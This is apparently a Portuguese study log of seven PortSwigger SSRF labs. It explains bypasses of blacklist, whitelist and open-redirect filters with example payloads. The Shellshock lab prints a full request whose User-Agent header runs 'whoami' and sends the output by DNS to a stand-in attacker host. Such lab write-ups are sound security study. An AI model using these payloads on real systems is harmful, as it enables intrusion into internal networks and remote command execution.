
---

#### 📌 SSRF – Server-Side Request Forgery
🟡 **Status**: 7/7 laboratórios trabalhados — conceitos, metodologia e lógica de exploração 100% dominados

**Conceito**: Vulnerabilidade que permite ao atacante fazer com que o servidor da aplicação envie requisições arbitrárias para destinos internos ou externos, acessando recursos, serviços e sistemas que não seriam diretamente visíveis ou acessíveis a partir da internet.

---

**Laboratórios resolvidos e documentados**:

1. **Basic SSRF against the local server** ✅
   - Manipulação do parâmetro ou cabeçalho responsável por carregar URLs
   - Redirecionamento da requisição para `http://localhost` ou `http://127.0.0.1`
   - **Objetivo**: Acessar interfaces de administração e serviços restritos que só aceitam conexões vindas do próprio servidor

2. **Basic SSRF against another back-end system** ✅
   - Alteração do alvo da requisição para endereços da rede interna, na faixa `192.168.0.0/24`
   - **Resultado**: Comunicação com máquinas e servidores de apoio que não possuem acesso público
   - **Aprendizado**: O SSRF funciona como um "ponte" entre a internet e a rede interna da aplicação

3. **SSRF with blacklist-based input filter** ✅
   - **Desafio**: A aplicação bloqueava termos como `localhost`, `127.0.0.1` e endereços privados
   - **Técnicas de contorno aplicadas**:
     - Uso de endereços IP em formatos alternativos: `2130706433`, `0177.0.0.1`, `0x7f.0.0.1`
     - Redirecionamento via domínios que resolvem para `127.0.0.1`
     - Inserção de caracteres extras na URL
   - **Resultado**: Acesso bem-sucedido ao servidor local mesmo com filtro ativo

4. **SSRF with filter bypass via open redirection** ✅
   - **Desafio**: A aplicação só permitia requisições para o próprio domínio
   - **Estratégia**: Combinação com uma falha de redirecionamento aberto existente na mesma aplicação
   - **Payload exemplo**:
     ```
     /redirect?url=http://127.0.0.1/admin
     ```
   - **Resultado**: O validador aceitava o caminho interno, e o redirecionamento levava a requisição para o destino desejado

5. **Blind SSRF with out-of-band detection** ✅ *Resolvido hoje*
   - **Cenário**: Não havia retorno do conteúdo da resposta, nenhuma mensagem ou alteração visível na interface
   - **Técnica utilizada**: Detecção via canal fora de banda (OAST)
   - **Vetor de ataque**: Cabeçalho HTTP `Referer`
   - **Ferramenta**: Interactsh
   - **Metodologia**: Configurar o cabeçalho para apontar para um domínio controlado, e aguardar a requisição chegar ao servidor de escuta
   - **Resultado**: Confirmação da vulnerabilidade por meio de consultas DNS e requisições HTTP registradas

6. **SSRF with whitelist-based input filter** ✅ *Resolvido posteriormente*
   - **Desafio**: A aplicação aceitava apenas URLs que continham o domínio `stock.weliketoshop.net` (lista branca)
   - **Problema explorado**: Diferença de interpretação entre o sistema que valida a entrada e o cliente HTTP que executa a requisição
   - **Técnicas aplicadas**:
     - Uso do caractere `@` para inserir credenciais fictícias: tudo antes de `@` é ignorado como usuário
     - Uso do caractere `#` para indicar um fragmento da URL, que também é ignorado na requisição final
     - Codificação dupla de caracteres para enganar o filtro de validação
   - **Payload final utilizado**:
     ```
     http://stock.weliketoshop.net%2523@127.0.0.1/admin
     ```
   - **Resultado**: O sistema validou a presença do domínio permitido, mas a requisição foi executada para o endereço interno

7. **Blind SSRF with Shellshock exploitation** 🟡 *Metodologia e fluxo de ataque totalmente compreendidos*
   - **Objetivo**: Explorar uma vulnerabilidade de SSRF cego para acessar um servidor interno da rede, e a partir dele explorar a falha Shellshock, transformando o acesso inicial em execução remota de comandos e extração de dados do sistema operacional
   - **Fluxo e lógica de ataque**:
     1. **Vetor SSRF**: A aplicação possui uma funcionalidade que carrega automaticamente o endereço informado no cabeçalho HTTP `Referer`, permitindo manipulação para acessar a faixa de IPs internos `192.168.0.0/24` na porta `8080`
     2. **Vetor Shellshock**: O servidor interno utiliza uma versão antiga e vulnerável do interpretador Bash, que interpreta cabeçalhos HTTP como variáveis de ambiente. A injeção segue o formato:
        ```
        () { :; }; COMANDO_A_SER_EXECUTADO
        ```
     3. **Extração de dados**: Como não há retorno visível, usa‑se a técnica OAST para enviar o resultado do comando `whoami` para um servidor externo controlado, via consulta DNS
   - **Requisição e payload prontos**:
     ```http
     GET /product?productId=4 HTTP/2
     Host: 0af30028034805ef825e2e92001900e9.web-security-academy.net
     Cookie: session=pM7PPdH5yPalXS9lk12BFVpDpLq1fDpo
     Referer: http://192.168.0.141:8080
     User-Agent: () { :; }; /usr/bin/nslookup $(whoami).seu-servidor-de-escuta.com
     ```
   - **Limitações encontradas nessa execução**:
     - A plataforma PortSwigger aplica regras de segurança que bloqueiam comunicação com servidores externos genéricos, permitindo apenas o uso do Burp Collaborator
     - Ferramentas alternativas gratuitas como o Interactsh foram automaticamente bloqueadas, impedindo a visualização da interação
   - **Conclusão**: Todo o fluxo, vetores e forma de exploração estão compreendidos e validados. Em ambientes sem restrições ou com as ferramentas adequadas, o ataque é funcional e replicável.

---

**✅ Principais aprendizados da categoria SSRF**:
- Vulnerabilidades de SSRF vão muito além de acessar arquivos: podem ser usadas para mapear redes, escutar portas e explorar outros sistemas internos
- Listas de permissão não são mais seguras que listas de bloqueio — dependem de uma interpretação consistente em todas as etapas do processamento
- Cabeçalhos e parâmetros que parecem inofensivos podem ser usados como vetores de ataque
- A combinação de falhas (encadeamento) permite evoluir de um acesso restrito para um impacto crítico
- Técnicas de detecção fora de banda são essenciais quando não há retorno visível na resposta da aplicação

---

